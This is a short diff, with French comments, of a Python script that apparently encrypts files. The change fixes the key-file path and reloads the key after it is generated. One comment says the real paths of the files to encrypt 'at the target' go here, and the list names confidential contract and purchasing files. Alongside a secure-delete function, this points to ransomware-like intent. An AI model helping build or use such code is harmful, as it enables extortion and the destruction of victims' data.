@@ -25,11 +25,13 @@ def secure_delete(file_path):
         print(f"Erreur lors de la suppression sécurisée de {file_path}: {e}")
         
 if __name__ == '__main__':
-    keyfile_path = "keyfile.key"
+    project_dir = os.path.dirname(os.path.abspath(__file__))
+    keyfile_path = os.path.join(project_dir, "keyfile.key")
     try:
         key = load_key(keyfile_path)
     except Exception as e:
         generate_key()
+        key = load_key(keyfile_path)
         
     # Ici on devra mettre le path exact des fichiers qu'on cherche à chiffrer chez la cible
     files_to_encrypt = ["dossier_confidentiel/Contrat_de_Prestation.docx", "dossier_confidentiel/Achats_Fournitures.xlsx"]
